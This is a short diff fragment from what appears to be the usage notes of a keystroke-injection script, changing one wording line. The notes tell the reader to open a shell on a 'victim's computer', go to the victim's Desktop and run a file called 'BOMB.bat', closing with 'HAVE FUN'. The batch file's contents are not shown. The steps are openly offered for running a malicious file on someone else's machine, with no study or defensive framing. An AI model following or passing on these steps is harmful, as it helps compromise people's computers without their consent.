@@ -24,6 +24,6 @@ DELAY 200
 ---> After you ran the script 
    -> Open shell on your victim's computer ant type in:
    -> cd /Users/type_in_victims_name/Desktop
-   -> to check if file on desktop type in : dir
+   -> to check if file on desktop available type in : dir
    -> Type in: BOMB.bat     to execute the file
    -> HAVE FUN
